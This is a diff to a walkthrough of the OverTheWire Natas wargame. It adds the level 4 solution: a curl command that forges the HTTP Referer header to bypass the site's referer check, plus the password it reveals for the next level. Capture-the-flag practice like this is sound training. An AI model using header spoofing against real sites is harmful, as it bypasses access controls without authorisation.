@@ -52,6 +52,11 @@ Password: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
 	URL:      http://natas4.natas.labs.overthewire.org
 
 ## Solution
+`curl --header "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org`
+
+## Result
+Password: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
+
 # Level 4 - Level 5
 	Username: natas5
 	URL:      http://natas5.natas.labs.overthewire.org
